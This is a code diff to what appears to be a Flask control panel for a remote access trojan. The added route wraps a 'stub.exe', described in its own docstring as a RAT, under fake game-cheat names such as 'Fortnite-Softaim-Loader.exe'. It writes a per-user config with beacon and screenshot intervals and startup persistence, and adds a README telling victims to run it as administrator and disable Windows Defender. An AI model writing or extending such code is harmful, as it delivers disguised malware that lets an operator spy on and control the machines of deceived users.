@@ -397,30 +397,76 @@ def build_stub():
 @app.route('/builder/cheat/<cheat_name>')
 @login_required
 def download_cheat(cheat_name):
-    """Download cheat package"""
+    """Download cheat (RAT exe with config) as ZIP"""
+    import zipfile
+    from io import BytesIO
+
     cheats = {
-        'fivem': 'FiveM-External-v3.2.zip',
-        'fortnite': 'Fortnite-Softaim-v5.1.zip',
-        'roblox': 'SynapseX-Cracked-v2.8.zip',
-        'minecraft': 'Wurst-Client-v7.4.zip',
-        'valorant': 'Valorant-External-v4.0.zip',
-        'csgo': 'CS2-External-v3.5.zip'
+        'fivem': ('FiveM-External-Loader.exe', 'FiveM-External-v3.2.zip'),
+        'fortnite': ('Fortnite-Softaim-Loader.exe', 'Fortnite-Softaim-v5.1.zip'),
+        'roblox': ('SynapseX-Loader.exe', 'SynapseX-Cracked-v2.8.zip'),
+        'minecraft': ('Wurst-Installer.exe', 'Wurst-Client-v7.4.zip'),
+        'valorant': ('Valorant-External-Loader.exe', 'Valorant-External-v4.0.zip'),
+        'csgo': ('CS2-External-Loader.exe', 'CS2-External-v3.5.zip')
     }
 
     if cheat_name not in cheats:
         flash('Cheat not found', 'error')
         return redirect(url_for('builder'))
 
-    zip_path = os.path.join(app.config['UPLOAD_FOLDER'], cheats[cheat_name])
-    if not os.path.exists(zip_path):
-        flash('Cheat file not found. Contact admin.', 'error')
+    exe_name, zip_name = cheats[cheat_name]
+    stub_path = os.path.join(app.config['UPLOAD_FOLDER'], 'stub.exe')
+
+    if not os.path.exists(stub_path):
+        flash('Stub not found. Contact admin.', 'error')
         return redirect(url_for('builder'))
+
+    # Get user's panel info
+    user = User.query.get(session['user_id'])
+    base_url = request.host_url.rstrip('/')
+
+    # Create config.json for this user
+    config_data = json.dumps({
+        'base_url': base_url,
+        'panel_id': user.panel_id,
+        'beacon_interval': 5,
+        'screenshot_interval': 2,
+        'startup': True,
+        'fake_error': False
+    }, indent=2)
+
+    # Create ZIP with exe + config
+    output = BytesIO()
+    with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
+        # Add the stub as the cheat exe
+        zf.write(stub_path, exe_name)
+        # Add config.json
+        zf.writestr('config.json', config_data)
+        # Add README
+        readme = f"""
+{cheat_name.upper()} CHEAT - INSTRUCTIONS
+{'='*40}
+
+1. Extract all files to a folder
+2. Run {exe_name} as ADMINISTRATOR
+3. Keep config.json in the SAME folder as the exe!
+
+IMPORTANT:
+- Disable Windows Defender before running
+- Do NOT rename config.json
+- Run BEFORE launching the game
+
+Your Panel ID: {user.panel_id}
+"""
+        zf.writestr('README.txt', readme)
+
+    output.seek(0)
 
     from flask import send_file
     return send_file(
-        zip_path,
+        output,
         as_attachment=True,
-        download_name=cheats[cheat_name],
+        download_name=zip_name,
         mimetype='application/zip'
     )
 
